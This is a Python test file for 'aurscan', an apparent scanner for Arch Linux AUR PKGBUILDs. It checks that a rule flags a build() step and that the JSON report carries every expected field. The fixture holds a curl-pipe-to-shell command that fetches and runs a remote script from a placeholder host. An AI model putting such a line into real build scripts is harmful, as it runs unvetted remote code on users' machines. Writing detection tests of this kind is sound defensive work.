"""Tests for report construction and JSON rendering."""

from __future__ import annotations

import json

from aurscan.parse import parse_pkgbuild
from aurscan.report import build_report, render_json
from aurscan.rules import RuleContext, registry
from tests.rules_utils import make_meta

STRONG = "b1946ac92492d2347c6235b4d2611184b1946ac92492d2347c6235b4d2611184"
CURL_SNIPPET = "curl -s https://example.invalid/a.sh"
PIPE_COMMAND = f"{CURL_SNIPPET} | sh"
SOURCE = f"""\
pkgname=demo
pkgver=1.0
pkgrel=1
arch=('x86_64')
url="https://example.invalid/demo"
source=("$url/demo-$pkgver.tar.gz")
sha256sums=('{STRONG}')

build() {{
  {PIPE_COMMAND}
}}
"""


def test_json_report_finding_has_full_schema() -> None:
    parsed = parse_pkgbuild(SOURCE)
    assert parsed.pkgbuild is not None
    meta = make_meta()
    context = RuleContext(
        pkgbuild=parsed.pkgbuild,
        install_scripts=(),
        meta=meta,
    )
    report = build_report(meta, parsed, registry.run_all(context))

    payload = json.loads(render_json(report))

    assert payload["findings"]
    item = next(
        finding for finding in payload["findings"] if finding["rule_id"] == "R01"
    )
    assert set(item) == {
        "rule_id",
        "severity",
        "message",
        "file",
        "line",
        "snippet",
        "source",
    }
    assert item["rule_id"] == "R01"
    assert item["severity"] == "high"
    assert item["message"]
    assert item["file"] == "PKGBUILD"
    assert item["line"] == SOURCE.splitlines().index(f"  {PIPE_COMMAND}") + 1
    assert item["snippet"] == CURL_SNIPPET
    assert item["source"] == "static"
